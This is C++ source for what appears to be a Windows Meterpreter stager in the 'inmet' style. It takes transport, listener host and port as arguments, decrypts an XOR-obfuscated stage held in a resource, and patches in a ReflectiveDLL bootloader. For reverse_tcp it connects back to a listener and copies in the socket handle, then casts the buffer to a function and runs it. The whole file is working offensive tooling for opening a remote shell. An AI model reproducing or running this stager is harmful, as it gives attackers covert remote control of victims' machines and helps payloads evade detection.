//»”„ «··Â «·—Õ„‰ «·—ÕÌ„
#include "main.h"

int wmain(int argc, wchar_t *argv[])
{
	PAYLOAD_SETTINGS payload_settings = {0}; //That's defined at main.h
	BYTE* buffer = nullptr; // this will hold the stage 
	DWORD bufferSize = 0;	// buffer length
	DWORD index = 0;		// will be used to locate strings to be patched "reverse_tcp, reverse_http, the url ... etc."
	char EncKey[16] = {0};	// XOR Encryption key
	SOCKET ConnectSocket = INVALID_SOCKET; // Socket ... will be used for reverse_tcp
	void (*function)();		// The casted-to-be-function after we have everything in place.

	/*
	Program Start
	*/
	// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct... ripped from "http://www.cplusplus.com/forum/articles/13355/"
	for (int i = 1; i < argc; i++) 
	{
		if (i + 1 != argc) // Check that we haven't finished parsing already
			if (wcscmp(argv[i], L"-t") == 0) { //Transport
				payload_settings.TRANSPORT = argv[i + 1];
				_wcsupr(payload_settings.TRANSPORT);
				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
				}
				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTP") == 0)
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTP";
				}
				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTPS") == 0)
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
				}
				else {
					dprintf(L"[-] Unknown transport: %s\n[-] Valid transports are reverse_tcp, reverse_http and reverse_https.\n", payload_settings.TRANSPORT);
					exit(0);
				}
				// End of Transport checks
			} else if (wcscmp(argv[i], L"-lh") == 0) {//LHOST
				payload_settings.LHOST = argv[i + 1];
			} else if (wcscmp(argv[i], L"-lp") == 0) { //LPORT
				payload_settings.LPORT = argv[i + 1];
			} else if (wcscmp(argv[i], L"-sct") == 0) { //SessionCommunicationTimeout in seconds - 300 by default
				payload_settings.comm_timeout = _wtoi(argv[i + 1]);
			} else if (wcscmp(argv[i], L"-set") == 0) { //SessionExpirationTimeout in seconds - 604800 by default
				payload_settings.expiration_timeout = _wtoi(argv[i + 1]);
			}  else if (wcscmp(argv[i], L"-ua") == 0) { //USER_AGENT
				payload_settings.USER_AGENT = argv[i + 1];
			}
	}

	// Read resource into buffer ...
	bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
	GetKeyFromBuffer(buffer, EncKey, 16);
	XORcrypt(buffer, EncKey, bufferSize);
	buffer = buffer + 11; // 16 bytes encryption key - 5 bytes for (0xBF + Socket number)

	/*
	if(argc == 1)
	{
	bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
	GetKeyFromBuffer(buffer, EncKey, 16);
	XORcrypt(buffer, EncKey, bufferSize);
	buffer = buffer + 11; // 16 bytes encryption key - 5 bytes for (0xBF + Socket number)
	}
	else
	{ 
	wchar_t filename[MAX_PATH] = {0};
	wcscpy_s(filename,argv[1]);
	bufferSize = CopyStageToBuffer(filename, &buffer);
	}
	*/

	// Patching transport 
	index = binstrstr(buffer, (int)bufferSize, (BYTE*)global_meterpreter_transport, (int)strlen(global_meterpreter_transport));
	dprintf(L"[*] Patching transport, Offset found at 0x%08x\n", index);
	PatchString(buffer, payload_settings.TRANSPORT, index, wcslen(payload_settings.TRANSPORT));

	// Patching ReflectiveDLL bootstrap 
	index = binstrstr(buffer, (int)bufferSize, (BYTE*)"MZ", (int)strlen("MZ"));
	dprintf(L"[*] Patching ReflectiveDll Bootstrap, Offset found at 0x%08x\n", index);	
	memcpy(buffer+index, ReflectiveDllBootLoader, 62);//dos header can't exceed 62

	//preparing connection...
	// Are we reverse_tcp?
	if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
	{
		ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
		if (ConnectSocket == INVALID_SOCKET)
		{
			dprintf(L"[-] Failed to connect...\n");
			exit(0);
		}
		dprintf(L"[*] Setting EDI-to-be value to 0xBF at 0x%08x\n", &buffer);
		buffer[0] = 0xBF;
		dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
		memcpy(buffer+1, &ConnectSocket, 4);
		dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
	} 
	// Are we reverse_http(s)?
	else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0)
	{

	}

	function = (void (*)())buffer;
	dprintf(L"[*] Calling the function, bye bye inmet, hello metasploit!\n");
	function();
	//function();


	return 0;
}
